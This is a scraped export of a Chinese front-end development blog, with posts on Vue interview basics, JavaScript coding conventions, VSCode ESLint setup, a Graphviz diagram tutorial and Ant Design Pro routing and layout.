Vue知识点整理链接https://segmentfault.com/a/1190000016344599 对于MVVM的理解？ Model代表数据模型，也可以在Model中定义数据修改和操作的业务逻辑。View 代表UI 组件，它负责将数据模型转化成UI 展现出来。ViewModel 监听模型数据的改变和控制视图行为、处理用户交互，简单理解就是一个同步View 和 Model的对象，连接Model和View。在MVVM架构下，View 和 Model 之间并没有直接的联系，而是通过ViewModel进行交互，Model 和 ViewModel 之间的交互是双向的， 因此View 数据的变化会同步到Model中，而Model 数据的变化也会立即反应到View 上。ViewModel 通过双向数据绑定把 View 层和 Model 层连接了起来，而View 和 Model 之间的同步工作完全是自动的，无需人为干涉，因此开发者只需关注业务逻辑，不需要手动操作DOM, 不需要关注数据状态的同步问题，复杂的数据状态维护完全由 MVVM 来统一管理。 Vue的生命周期（8个阶段：创建前/后, 载入前/后,更新前/后,销毁前/销毁后) Vue 实例从创建到销毁的过程，就是生命周期。从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、销毁等一系列过程，称之为 Vue 的生命周期。beforeCreate（创建前） 在数据观测和初始化事件还未开始created（创建后） 完成数据观测，属性和方法的运算，初始化事件，$el属性还没有显示出来beforeMount（载入前） 在挂载开始之前被调用，相关的render函数首次被调用。实例已完成以下的配置：编译模板，把data里面的数据和模板生成html。注意此时还没有挂载html到页面上。mounted（载入后） 在el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用。实例已完成以下的配置：用上面编译好的html内容替换el属性指向的DOM对象。完成模板中的html渲染到html页面中。此过程中进行ajax交互。beforeUpdate（更新前） 在数据更新之前调用，发生在虚拟DOM重新渲染和打补丁之前。可以在该钩子中进一步地更改状态，不会触发附加的重渲染过程。updated（更新后） 在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。调用时，组件DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。beforeDestroy（销毁前） 在实例销毁之前调用。实例仍然完全可用。destroyed（销毁后） 在实例销毁之后调用。调用后，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。 Vue实现数据双向绑定的原理：Object.defineProperty（） Vue组件间的参数传递1.父组件与子组件传值父组件传给子组件：子组件通过props方法接受数据;子组件传给父组件：$emit方法传递参数2.非父子组件间的数据传递，兄弟组件传值eventBus，就是创建一个事件中心，相当于中转站，可以用它来传递事件和接收事件。项目比较小时，用这个比较合适 vue路由的钩子函数 首页可以控制导航跳转，beforeEach，afterEach等，一般用于页面title的修改。一些需要登录才能调整页面的重定向功能。 beforeEach主要有3个参数to，from，next： to：route即将进入的目标路由对象， from：route当前导航正要离开的路由 next：function一定要调用该方法resolve这个钩子。执行效果依赖next方法的调用参数。可以控制网页的跳转。 vuex是什么？怎么使用？哪种功能场景使用它只用来读取的状态集中放在store中； 改变状态的方式是提交mutations，这是个同步的事物； 异步逻辑应该封装在action中。在main.js引入store，注入。新建了一个目录store，….. export 。场景有：单页应用中，组件之间的状态、音乐播放、登录状态、加入购物车","categories":[{"name":"前端分享","slug":"前端分享","permalink":"https://ru23.com/categories/前端分享/"}],"tags":[{"name":"前端周刊","slug":"前端周刊","permalink":"https://ru23.com/tags/前端周刊/"}]},{"title":"前端开发规范-used by frank","slug":"2018-09-前端开发规范-used-by-frank","date":"2018-09-21T08:20:34.000Z","updated":"2018-10-24T03:46:03.326Z","comments":true,"path":"note/bf4c76a0.html","link":"","permalink":"https://ru23.com/note/bf4c76a0.html","excerpt":"","text":"js方法注释规范规范的注释很重要代码是写给人看的，顺便给机器运行，多谢注释可以增加代码的可读性 123456789101112131415161718/** ************** * @func 教师端请假功能 ; * @param &#123;String&#125; token 教师端头部的token; * @param &#123;string&#125; a - 参数a; * @param &#123;number&#125; b=1 - 参数b默认值为1; * @param &#123;string&#125; c=1 - 参数c有两种支持的取值&lt;/br&gt;1—表示x&lt;/br&gt;2—表示xx; * @param &#123;object&#125; d - 参数d为一个对象; * @param &#123;string&#125; d.e - 参数d的e属性; * @param &#123;string&#125; d.f - 参数d的f属性; * @param &#123;object[]&#125; g - 参数g为一个对象数组; * @param &#123;string&#125; g.h - 参数g数组中一项的h属性; * @param &#123;string&#125; g.i - 参数g数组中一项的i属性; * @param &#123;string&#125; [j] - 参数j是一个可选参数; * @description 2018年4月19日被frank开发于dev_sprint65分支， * XX年XX月被XX在xx分支修改（原因或者修改的功能）; ****************/ 变量命名规范1.标准变量命名使用驼峰式命名 eg. let thisIsMyName;2.常量全部大写，并使用下划线连接 eg. const MAX_COUNT = 10; 项目规范变量声明尽量提在函数首部，用一个var声明，不允许出现连着的两个var声明(也包括let，const) 1234567891011function doSomethingWithItems(items) &#123; // use one var var value = 10, result = value + 10, i, len; for (i = 0, len = items.length; i &lt; len; i++) &#123; result += 10; &#125;&#125; undefind使用规范（永远不要直接使用undefined进行变量判断，使用typeof和字符串’undefined’对变量进行判断。） 123456789// not goodif (person === undefined) &#123; ...&#125;// goodif (typeof person === 'undefined') &#123; ...&#125; 用’===’和’!==’代替’==’, ‘!=’使用对象的属性简写123456789const job = 'FrontEnd'// badconst item = &#123; job: job&#125;// goodconst item = &#123; job&#125; 使用拓展运算符 … 复制数组1234567891011// badconst items = []const itemsCopy = []const len = items.lengthlet i// badfor (i = 0; i &lt; len; i++) &#123; itemsCopy[i] = items[i]&#125;// gooditemsCopy = [...items] render使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051render: (h, params) =&gt; &#123; return h('div', [ h('span', &#123; attrs: &#123; class: \"table_details\" &#125;, on: &#123; click: () =&gt; &#123; this.edit(params.index) &#125; &#125; &#125;,), h('span', &#123; attrs: &#123; class: \"table_continue\" &#125;, on: &#123; click: () =&gt; &#123; this.show(params.index) &#125; &#125; &#125;,), h('span', &#123; attrs: &#123; class: \"table_more no_border_right\" &#125;, on: &#123; click: () =&gt; &#123; this.remove(params.row.id) &#125; &#125; &#125;,), h('Poptip', &#123; props: &#123; title:\"项目变更\", content:\"项目迁出\", placement:\"bottom-end\" &#125;, on: &#123; 'on-ok': () =&gt; &#123; &#125; &#125; &#125;, [ h('span', &#123; attrs: &#123; class: \"table_more no_border_right\" &#125; &#125;) ]) ])&#125; 文档：有时间整理一下http://taobaofed.org/blog/2017/01/05/writing-readable-code/","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"前端自动化","slug":"前端自动化","permalink":"https://ru23.com/tags/前端自动化/"}]},{"title":"VsCode读取项目文件的Eslint规则 保存时自动修复格式错误","slug":"2018-09-VsCode读取项目文件的Eslint规则-保存时自动修复格式错误","date":"2018-09-17T08:29:10.000Z","updated":"2018-10-24T03:46:02.637Z","comments":true,"path":"note/e7d1661f.html","link":"","permalink":"https://ru23.com/note/e7d1661f.html","excerpt":"","text":"配置：安装VsCode的EsLint和vetur插件为项目安装EsLint包注意要安装在开发环境上，还有就是如果你使用的是脚手架的话，选了Eslint选项，会自带这些包。 在项目的根目录下添加.eslintrc.js用于校验代码格式，根据项目情况，可自行编写校验规则：123module.exports = &#123; // Eslint规则&#125; 首选项设置：将下面这部分放入首选项设置中： \"eslint.autoFixOnSave\": true, // 启用保存时自动修复,默认只支持.js文件 \"eslint.validate\": [ \"javascript\", // 用eslint的规则检测js文件 { \"language\": \"vue\", // 检测vue文件 \"autoFix\": true // 为vue文件开启保存自动修复的功能 }, { \"language\": \"html\", \"autoFix\": true }, ], 大功告成：点开文件，你可能会看到如下报错，无需一个一个去改，只要保存一下文件，就可以自动修复这些代码格式上的问题了。 注意：如果整个文件都飘红的话，不会一次性修改如果的格式问题，会一下改一部分，你可能需要多按几次保存。","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[]},{"title":"学会使用Graphviz绘制流程图","slug":"2018-09-graphviz","date":"2018-09-17T03:20:08.000Z","updated":"2018-10-24T03:46:02.612Z","comments":true,"path":"note/9e68349b.html","link":"","permalink":"https://ru23.com/note/9e68349b.html","excerpt":"","text":"一、初识Graphviz1.1 简介 GraphViz是一个开源的图像可视化的软件，是贝尔实验室开发的一个开源的工具包，它使用一个特定的DSL(领域特定语言): dot作为脚本语言，然后使用布局引擎来解析此脚本，并完成自动布局。graphviz提供丰富的导出格式，如常用的图片格式，SVG，PDF格式等 1.2 环境搭建结合sublime Text插件实时编译预览 使用shift+command+p，输入搜索选中Package Control: Install Package,然后输入GraphViz,然后安装GraphVizPreview即可，安装完成后，只要全选中代码，然后按shift+command+g就可以预览了。 其实也可以直接用brew安装GraphViz,但是每次要敲命令行，太麻烦了 mac下执行 1brew install graphviz 终端编译代码 dot test.dot -T png -o test.png 二、使用 Graphviz 支持两类图：无向图（graph,用“ - - ”表示节点之间）和 有向图（digraph,用“ -&gt;” 表示节点之间）。graphviz包含3中元素，图，顶点和边。每个元素都可以具有各自的属性，用来定义字体，样式，颜色，形状等 GraphViz中包含多种布局 dot 默认布局，用于有向图 neato 基于spring-model算法(force-based) twopo 径向布局 circo 圆形布局 fdp 用于无向图 2.1 第一个graphviz图 语法介绍 http://graphs.grevian.org/reference 12345678910digraph abc&#123; a; b; c; d; a -&gt; b; b -&gt; d; c -&gt; d;&#125; 定义顶点和边的样式 123456789101112digraph abc&#123; node [shape=&quot;record&quot;]; edge [style=&quot;dashed&quot;]; a; b; c; d; a -&gt; b; b -&gt; d; c -&gt; d;&#125; 进一步修改顶点和边样式,将顶点a的颜色改为淡绿色，并将c到d的边改为红色 12345678910111213digraph abc&#123; node [shape=&quot;record&quot;]; edge [style=&quot;dashed&quot;]; a [style=&quot;filled&quot;, color=&quot;black&quot;, fillcolor=&quot;chartreuse&quot;]; b; c; d; a -&gt; b; b -&gt; d; c -&gt; d [color=&quot;red&quot;];&#125; 其他例子 1234567891011121314151617digraph demo&#123; label=&quot;儿茶酚胺合成代谢路径&quot;; 酪氨酸 -&gt; L多巴 -&gt; 多巴胺 -&gt; 去甲肾上腺素 -&gt; 肾上腺素; 下丘脑 -&gt; 多巴胺; 交感神经元 -&gt; 去甲肾上腺素; 肾上腺髓质 -&gt; 去甲肾上腺素,肾上腺素; 酪氨酸 [label=&quot;酪氨酸&quot;,color=green]; 多巴胺 [label=&quot;多巴胺&quot;, color=red]; 肾上腺素 [label=&quot;肾上腺素&quot;, color=red]; 下丘脑 [shape=box]; 交感神经元 [shape=box]; 肾上腺髓质 [shape=box];&#125; 2.2 带标签1234567digraph &#123; player[label = &quot;player&quot;, color = Blue, fontcolor = Red, fontsize = 24, shape = box]; game[label = &quot;game&quot;, color = Red, fontcolor = Blue, fontsize = 24, shape = ellipse]; player -&gt; game[label = &quot;play&quot;]&#125; 2.3 子视图1234567891011121314151617181920digraph &#123; label = visitNet rankdir = LR node[color = Red, fontsize = 24, shape = box] edge[color = Blue, style = &quot;dashed&quot;] user[style = &quot;filled&quot;, color = &quot;yellow&quot;, fillcolor = &quot;chartreuse&quot;] subgraph cluster_cd&#123; label = &quot;server and browser&quot; bgcolor = green; browser -&gt; server &#125; user -&gt; computer; computer -&gt; browser;&#125; 2.4 结构视图123456789digraph &#123; node[shape = record]; struct1[label = &quot;&lt;f0&gt; left|&lt;f1&gt; mid&amp;#92; dle|&lt;f2&gt; right&quot;]; struct2[label = &quot;&lt;f0&gt; one|&lt;f1&gt; two&quot;]; struct3[label = &quot;hello&amp;#92;nworld | &#123;b|&#123;c|&lt;here&gt; d|e&#125;|f&#125;|g|h&quot;]; struct1:f1 -&gt; struct2:f0; struct1:f2 -&gt; struct3:here;&#125; 2.5 树形结构12345678910111213141516171819202122digraph tree &#123; fontname = &quot;PingFang-SC-Light&quot; fontsize = 24 node[shape = &quot;plaintext&quot;] 1 -&gt; 2; 1 -&gt; 3; 2 -&gt; 4; 2 -&gt; 5; 3 -&gt; 6; 3 -&gt; 7; 4 -&gt; 8; 4 -&gt; 9; 5 -&gt; 10; 5 -&gt; 11; 6 -&gt; 12; 6 -&gt; 13; 7 -&gt; 14; 7 -&gt; 15;&#125; 2.6 时序图1234567891011121314151617181920212223242526272829303132333435363738digraph time &#123; rankdir = &quot;LR&quot;; node[shape = &quot;point&quot;, width = 0, height = 0]; edge[arrowhead = &quot;none&quot;, style = &quot;dashed&quot;]; &#123; rank = &quot;same&quot; edge[style = &quot;solided&quot;]; APP[shape = &quot;plaintext&quot;]; APP -&gt; step00 -&gt; step01 -&gt; step02 -&gt; step03 -&gt; step04 -&gt; step05; &#125; &#123; rank=&quot;same&quot;; edge[style=&quot;solided&quot;]; SDK[shape=&quot;plaintext&quot;]; SDK -&gt; step10 -&gt; step11 -&gt; step12 -&gt; step13 -&gt; step14 -&gt; step15; &#125; &#123; rank=&quot;same&quot;; edge[style=&quot;solided&quot;]; AliPay[shape=&quot;plaintext&quot;]; AliPay -&gt; step20 -&gt; step21 -&gt; step22 -&gt; step23 -&gt; step24 -&gt; step25; &#125; &#123; rank=&quot;same&quot;; edge[style=&quot;solided&quot;]; Server[shape=&quot;plaintext&quot;]; Server -&gt; step30 -&gt; step31 -&gt; step32 -&gt; step33 -&gt; step34 -&gt; step35; &#125; step00 -&gt; step10 [label=&quot;sends order info&quot;, arrowhead=&quot;normal&quot;]; step11 -&gt; step21 [label=&quot;open AliPay&quot;, arrowhead=&quot;normal&quot;]; step22 -&gt; step12 [label=&quot;pay success&quot;, arrowhead=&quot;normal&quot;]; step13 -&gt; step03 [label=&quot;pay success&quot;, arrowhead=&quot;normal&quot;]; step24 -&gt; step34 [label=&quot;pay success&quot;, arrowhead=&quot;normal&quot;];&#125; 2.7 一个hash表的数据结构 hash表内容 123456789101112131415161718192021struct st_hash_type &#123; int (*compare) (); int (*hash) ();&#125;; struct st_table_entry &#123; unsigned int hash; char *key; char *record; st_table_entry *next;&#125;; struct st_table &#123; struct st_hash_type *type; int num_bins;/* slot count */ int num_entries;/* total number of entries */ struct st_table_entry **bins;/* slot */&#125;; 脚本如下： 1234567891011121314151617digraph st2&#123; fontname = &quot;Verdana&quot;; fontsize = 10; rankdir=TB; node [fontname = &quot;Verdana&quot;, fontsize = 10, color=&quot;skyblue&quot;, shape=&quot;record&quot;]; edge [fontname = &quot;Verdana&quot;, fontsize = 10, color=&quot;crimson&quot;, style=&quot;solid&quot;]; st_hash_type [label=&quot;&#123;&lt;head&gt;st_hash_type|(*compare)|(*hash)&#125;&quot;]; st_table_entry [label=&quot;&#123;&lt;head&gt;st_table_entry|hash|key|record|&lt;next&gt;next&#125;&quot;]; st_table [label=&quot;&#123;st_table|&lt;type&gt;type|num_bins|num_entries|&lt;bins&gt;bins&#125;&quot;]; st_table:bins -&gt; st_table_entry:head; st_table:type -&gt; st_hash_type:head; st_table_entry:next -&gt; st_table_entry:head [style=&quot;dashed&quot;, color=&quot;forestgreen&quot;];&#125; 2.8 模块的生命周期图123456789101112131415161718192021222324252627digraph module_lc&#123; rankdir=TB; fontname = &quot;Microsoft YaHei&quot;; fontsize = 12; node [fontname = &quot;Microsoft YaHei&quot;, fontsize = 12, shape = &quot;Mrecord&quot;, color=&quot;skyblue&quot;, style=&quot;filled&quot;]; edge [fontname = &quot;Microsoft YaHei&quot;, fontsize = 12, color=&quot;darkgreen&quot; ]; installed [label=&quot;已安装状态&quot;]; resolved [label=&quot;已就绪状态&quot;]; uninstalled [label=&quot;已卸载状态&quot;]; starting [label=&quot;正在启动&quot;]; active [label=&quot;已激活(运行)状态&quot;]; stopping [label=&quot;正在停止&quot;]; start [label=&quot;&quot;, shape=&quot;circle&quot;, width=0.5, fixedsize=true, style=&quot;filled&quot;, color=&quot;black&quot;]; start -&gt; installed [label=&quot;安装&quot;]; installed -&gt; uninstalled [label=&quot;卸载&quot;]; installed -&gt; resolved [label=&quot;准备&quot;]; installed -&gt; installed [label=&quot;更新&quot;]; resolved -&gt; installed [label=&quot;更新&quot;]; resolved -&gt; uninstalled [label=&quot;卸载&quot;]; resolved -&gt; starting [label=&quot;启动&quot;]; starting -&gt; active [label=&quot;&quot;]; active -&gt; stopping [label=&quot;停止&quot;]; stopping -&gt; resolved [label=&quot;&quot;];&#125; 2.9 简单的UML类图12345678910111213141516171819202122digraph G&#123; fontname = &quot;Courier New&quot; fontsize = 10 node [ fontname = &quot;Courier New&quot;, fontsize = 10, shape = &quot;record&quot; ]; edge [ fontname = &quot;Courier New&quot;, fontsize = 10 ]; Animal [ label = &quot;&#123;Animal |+ name : String\\\\l+ age : int\\\\l|+ die() : void\\\\l&#125;&quot; ]; subgraph clusterAnimalImpl&#123; bgcolor=&quot;yellow&quot; Dog [ label = &quot;&#123;Dog||+ bark() : void\\\\l&#125;&quot; ]; Cat [ label = &quot;&#123;Cat||+ meow() : void\\\\l&#125;&quot; ]; &#125;; edge [ arrowhead = &quot;empty&quot; ]; Dog-&gt;Animal; Cat-&gt;Animal; Dog-&gt;Cat [arrowhead=&quot;none&quot;, label=&quot;0..*&quot;];&#125; 2.10 有限状态机1234567891011digraph finite_state_machine &#123; rankdir=LR; size=&quot;8,5&quot; node [shape = circle]; S0 -&gt; S1 [ label = &quot;Lift Nozzle&quot; ] S1 -&gt; S0 [ label = &quot;Replace Nozzle&quot; ] S1 -&gt; S2 [ label = &quot;Authorize Pump&quot; ] S2 -&gt; S0 [ label = &quot;Replace Nozzle&quot; ] S2 -&gt; S3 [ label = &quot;Pull Trigger&quot; ] S3 -&gt; S2 [ label = &quot;Release Trigger&quot; ]&#125; 三、语法 完整列表 http://graphviz.org/doc/info/attrs.html 3.1 图像属性 label=&quot;My Graph&quot;; 给图像设置标签 rankdir=LR; 将图片由原来的从上到下布局变成从左到右布局 {rank=same; a, b, c } 将一组元素放到同一个level splines=&quot;line&quot;; 让边框变为直线，没有曲线和锐角 K=0.6; 用来在布局中影响spring属性，spring属性可以用于将节点往外推，这个在twopi和sfdp布局中很有用。 3.2 交点属性 [label=&quot;Some Label&quot;] 给交点打标签 [color=&quot;red&quot;] 给交点上色 [fillcolor=&quot;blue&quot;] 设置交点的填充色 3.3 边的属性 [label=&quot;Some Label&quot;] 给边设置标签 (设置路径权重的时候很有用) [color=&quot;red&quot;] # 给交点上色 (标示路径的时候很有用) [penwidth=2.0] # 给边适配厚度，标示路径的时候很有用。 3.4 尺寸, 背景颜色 fixedsize=true; size=&quot;1,1&quot;; resolution=72; bgcolor=&quot;#C6CFD532&quot;; 四、一些技巧4.1 插入图片123456digraph &#123; c[shape = none, image = &quot;./pic.png&quot;] a -&gt; b -&gt; c; c -&gt; d;&#125; 注：需要用命令行dot test.dot -T png -o test.png生成，前提是用brew安装了GraphViz 4.2 统一节点和连线123456789digraph &#123; node[color = Red, fontsize = 24, shape = box] edge[color = Blue, style = &quot;dashed&quot;] c[shape = none, image = &quot;./pic.png&quot;] a -&gt; b -&gt; c; c -&gt; d;&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Graphviz","slug":"Graphviz","permalink":"https://ru23.com/tags/Graphviz/"}]},{"title":"Ant Design Pro总结篇","slug":"2018-09-ant-design-pro","date":"2018-09-16T16:10:23.000Z","updated":"2018-10-24T03:46:02.607Z","comments":true,"path":"note/ab0115f0.html","link":"","permalink":"https://ru23.com/note/ab0115f0.html","excerpt":"","text":"一、简介1.1 ant pro系统特性 基于 Ant Design 体系精心设计 使用 React/umi/dva/antd 等前端前沿技术开发 针对不同屏幕大小设计 可配置的主题满足多样化的品牌诉求 Mock 数据实用的本地数据调试方案 1.2 模板123456789101112131415161718192021222324252627282930- Dashboard - 分析页 - 监控页 - 工作台- 表单页 - 基础表单页 - 分步表单页 - 高级表单页- 列表页 - 查询表格 - 标准列表 - 卡片列表 - 搜索列表（项目/应用/文章）- 详情页 - 基础详情页 - 高级详情页- 结果 - 成功页 - 失败页- 异常 - 403 无权限 - 404 找不到 - 500 服务器出错- 个人页 - 个人中心 - 个人设置- 帐户 - 登录 - 注册 - 注册成功 1.3 使用12$ git clone --depth=1 https://github.com/ant-design/ant-design-pro.git my-project$ cd my-project 或者 123$ npm install ant-design-pro-cli -g$ mkdir my-project &amp;&amp; cd my-project$ pro new # 安装脚手架 1.4 目录结构整个项目的目录结构 1234567891011121314151617181920212223242526272829303132├── mock # 本地模拟数据├── node_modules # 依赖库├── public│ ├── favicon.ico # Favicon│ └── index.html # HTML 入口模板├── src│ ├── common # 应用公用配置，如导航信息│ ├── components # 业务通用组件│ ├── e2e # 集成测试用例│ ├── layouts # 通用布局│ ├── models # dva model│ ├── routes # 业务页面入口和常用模板│ ├── services # 后台接口服务│ ├── utils # 工具库│ ├── g2.js # 可视化图形配置│ ├── polyfill.js # 兼容性垫片│ ├── theme.js # 主题配置│ ├── index.js # 应用入口│ ├── index.less # 全局样式│ └── router.js # 路由入口├── tests # 测试工具├── .editorconfig # 编辑器配置├── .eslintrc # js代码检测工具├── .ga # 未知├── .gitignore # git版本配置├── .roadhogrc # roadhog配置├── .roadhogrc.mock.js # roadhog的模拟配置├── .stylelintrc # css代码审查配置├── .travis.yml # travis持续构建工具配置├── package.json # web前端项目配置文件├── README.md└── roadhog摘要介绍 roadhog 是一个 cli 工具，提供 server、 build 和 test 三个命令，分别用于本地调试和构建，并且提供了特别易用的 mock 功能。命令行体验和 create-react-app 一致，配置略有不同，比如默认开启 css modules，然后还提供了 JSON 格式的配置方式。 重点介绍roadhog有关的几个配置项，主要是在ant design pro的代码中用到了这些配置项 entry 指定 webpack 入口文件，支持 glob格式。 如果你的项目是多页类型，会希望把 src/pages的文件作为入口。可以这样配： 1&quot;entry&quot;: &quot;src/pages/\\*.js&quot; env 针对特定的环境进行配置。server 的环境变量是 development，build 的环境变量是production。 比如： 123456\"extraBabelPlugins\": [\"transform-runtime\"],\"env\": &#123; \"development\": &#123; \"extraBabelPlugins\": [\"dva-hmr\"] &#125;&#125; 这样，开发环境下的 extraBabelPlugins 是 [&quot;transform-runtime&quot;, &quot;dva-hmr&quot;]，而生产环境下是 [&quot;transform-runtime&quot;]。 12345678910111213141516171819\"env\": &#123; \"development\": &#123; \"extraBabelPlugins\": [ \"dva-hmr\", \"transform-runtime\", \"transform-decorators-legacy\", \"transform-class-properties\", [\"import\", &#123; \"libraryName\": \"antd\", \"style\": true &#125;] ] &#125;, \"production\": &#123; \"extraBabelPlugins\": [ \"transform-runtime\", \"transform-decorators-legacy\", \"transform-class-properties\", [\"import\", &#123; \"libraryName\": \"antd\", \"style\": true &#125;] ] &#125;&#125; 在这段代码中，开发环境和生产环境分别配置，其中开发环境使用了dva-hmr插件 二、布局 页面整体布局是一个产品最外层的框架结构，往往会包含导航、页脚、侧边栏、通知栏以及内容等。在页面之中，也有很多区块的布局结构。在真实项目中，页面布局通常统领整个应用的界面，有非常重要的作用 2.1 Ant Design Pro 的布局 在 Ant Design Pro 中，我们抽离了使用过程中的通用布局，都放在 layouts 目录中，分别为 BasicLayout：基础页面布局，包含了头部导航，侧边栏和通知栏 UserLayout：抽离出用于登陆注册页面的通用布局 BlankLayout：空白的布局 2.2 如何使用 Ant Design Pro 布局 通常布局是和路由系统紧密结合的，Ant Design Pro 的路由使用了 Umi 的路由方案，为了统一方便的管理路由和页面的关系，我们将配置信息统一抽离到 config/router.config.js 下，通过如下配置定义每个页面的布局 123456789101112131415161718module.exports = [&#123; path: '/', component: '../layouts/BasicLayout', // 指定以下页面的布局 routes: [ // dashboard &#123; path: '/', redirect: '/dashboard/analysis' &#125;, &#123; path: '/dashboard', name: 'dashboard', icon: 'dashboard', routes: [ &#123; path: '/dashboard/analysis', name: 'analysis', component: './Dashboard/Analysis' &#125;, &#123; path: '/dashboard/monitor', name: 'monitor', component: './Dashboard/Monitor' &#125;, &#123; path: '/dashboard/workplace', name: 'workplace', component: './Dashboard/Workplace' &#125;, ], &#125;, ],&#125;] 更多 Umi 的路由配置方式可以参考：Umi 配置式路由 2.3 Pro 扩展配置 我们在 router.config.js 扩展了一些关于 pro 全局菜单的配置 12345678&#123; name: 'dashboard', icon: 'dashboard', hideInMenu: true, hideChildrenInMenu: true, hideInBreadcrumb: true, authority: ['admin'],&#125; name: 当前路由在菜单和面包屑中的名称，注意这里是国际化配置的 key，具体展示菜单名可以在 /src/locales/zh-CN.js 进行配置。 icon: 当前路由在菜单下的图标名。 hideInMenu: 当前路由在菜单中不展现，默认 false。 hideChildrenInMenu: 当前路由的子级在菜单中不展现，默认 false。 hideInBreadcrumb: 当前路由在面包屑中不展现，默认 false。 authority: 允许展示的权限，不设则都可见，详见：权限管理 2.4 Ant Design 布局组件 除了 Pro 里的内建布局以为，在一些页面中需要进行布局，可以使用 Ant Design 目前提供的两套布局组件工具：Layout 和 Grid Grid 组件 栅格布局是网页中最常用的布局，其特点就是按照一定比例划分页面，能够随着屏幕的变化依旧保持比例，从而具有弹性布局的特点。 而 Ant Design 的栅格组件提供的功能更为强大，能够设置间距、具有支持响应式的比例设置，以及支持 flex 模式，基本上涵盖了大部分的布局场景 https://ant.design/components/grid/ Layout 组件 如果你需要辅助页面框架级别的布局设计，那么 Layout 则是你最佳的选择，它抽象了大部分框架布局结构，使得只需要填空就可以开发规范专业的页面整体布局 https://ant.design/components/layout-cn/ 根据不同场景区分抽离布局组件#在大部分场景下，我们需要基于上面两个组件封装一些适用于当下具体业务的组件，包含了通用的导航、侧边栏、顶部通知、页面标题等元素。例如 Ant Design Pro 的 BasicLayout。 通常，我们会把抽象出来的布局组件，放到跟 pages、 components 平行的 layouts 文件夹中方便管理。需要注意的是，这些布局组件和我们平时使用的其它组件并没有什么不同，只不过功能性上是为了处理布局问题 四、路由和菜单 路由和菜单是组织起一个应用的关键骨架，pro 中的路由为了方便管理，使用了中心化的方式，在 router.config.js 统一配置和管理 4.1 基本结构 路由管理 通过约定的语法根据在 router.config.js 中配置路由。 菜单生成 根据路由配置来生成菜单。菜单项名称，嵌套路径与路由高度耦合。 面包屑 组件 PageHeader 中内置的面包屑也可由脚手架提供的配置信息自动生成 4.1.1 路由 目前脚手架中所有的路由都通过 router.config.js 来统一管理，在 umi 的配置中我们增加了一些参数，如name,icon,hideChildren,authority，来辅助生成菜单。其中 name 和 icon分别代表生成菜单项的图标和文本。 hideChildren 用于隐藏不需要在菜单中展示的子路由。用法可以查看 分步表单 的配置。 hideInMenu 可以在菜单中不展示这个路由，包括子路由。效果可以查看 exception/trigger页面。 authority 用来配置这个路由的权限，如果配置了将会验证当前用户的权限，并决定是否展示 4.1.2 菜单 菜单根据 router.config.js 生成，具体逻辑在 src/layouts/BasicLayout 中的 formatter 方法实现 如果你的项目并不需要菜单，你可以直接在BasicLayout 中删除 SiderMenu 组件的挂载。并在 src/layouts/BasicLayout 中 设置 const MenuData = []。 如果你需要从服务器请求菜单，可以将menuData设置为 state，然后通过网络获取来修改了 state 4.1.3 面包屑 面包屑由 PageHeaderLayout 实现，MenuContext 将 根据 MenuData 生成的 breadcrumbNameMap 通过props 传递给了 PageHeader，如果你要做自定义的面包屑，可以通过修改传入的 breadcrumbNameMap 来解决 breadcrumbNameMap 示例数据如下： 123456789&#123; '/': &#123; path: '/', redirect: '/dashboard/analysis', locale: 'menu' &#125;, '/dashboard/analysis': &#123; name: 'analysis', component: './Dashboard/Analysis', locale: 'menu.dashboard.analysis', &#125;, ...&#125; 4.2 需求实例4.2.1 新增页面 脚手架默认提供了两种布局模板：基础布局 - BasicLayout 以及 账户相关布局 - UserLayout 如果你的页面可以利用这两种布局，那么只需要在路由配置中增加一条即可 12345678910 // app &#123; path: '/', component: '../layouts/BasicLayout', routes: [ // dashboard &#123; path: '/', redirect: '/dashboard/analysis' &#125;, &#123; path :'/dashboard/test',component:\"./Dashboard/Test\"&#125;, ...&#125;, 加好后，会默认生成相关的路由及导航 4.2.2 新增布局 在脚手架中我们通过嵌套路由来实现布局模板。router.config.js 是一个数组，其中第一级数据就是我们的布局，如果你需要新增布局可以在直接增加一个新的一级数组 1234567891011121314151617181920module.exports = [ // user &#123; path: '/user', component: '../layouts/UserLayout', routes:[...] &#125;, // app &#123; path: '/', component: '../layouts/BasicLayout', routes:[...] &#125;, // new &#123; path: '/new', component: '../layouts/new_page', routes:[...] &#125;,] 4.2.3 带参数的路由 脚手架默认支持带参数的路由,但是在菜单中显示带参数的路由并不是个好主意，我们并不会自动的帮你注入一个参数，你可能需要在代码中自行处理 123456&#123; path: '/dashboard/:page', hideInMenu:true, name: 'analysis', component: './Dashboard/Analysis' &#125;, 你可以通过以下代码来跳转到这个路由 123456789import router from 'umi/router';router.push('/dashboard/anyParams')//orimport Link from 'umi/link';&lt;Link to=\"/dashboard/anyParams\"&gt;go&lt;/Link&gt; 在路由组件中，可以通过this.props.match.params 来获得路由参数 五、新增页面 这里的『页面』指配置了路由，能够通过链接直接访问的模块，要新建一个页面，通常只需要在脚手架的基础上进行简单的配置 5.1 新增 js、less 在 src/pages 下新建页面的 js 及 less 文件，如果相关页面有多个，可以新建一个文件夹来放置相关文件 样式文件默认使用 CSS Modules，如果需要，你可以在样式文件的头部引入 antd 样式变量文件 1@import &quot;~antd/lib/style/themes/default.less&quot;; 5.2 将文件加入菜单和路由 加入菜单和路由的方式请参照 路由和菜单 - 添加路由/菜单 中的介绍完成。加好后，访问 http://localhost:8000/#/new 就可以看到新增的页面了 https://pro.ant.design/docs/router-and-nav-cn#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1/%E8%8F%9C%E5%8D%95 5.3 新增 model、service 布局及路由都配置好之后，回到之前新建的 NewPage.js，可以开始写业务代码了！如果需要用到 dva 中的数据流，还需要在 src/models src/services 中建立相应的model 和 service，具体可以参考脚手架内置页面的写法 六、新增业务组件 对于一些可能被多处引用的功能模块，建议提炼成业务组件统一管理。这些组件一般有以下特征： 只负责一块相对独立，稳定的功能； 没有单独的路由配置； 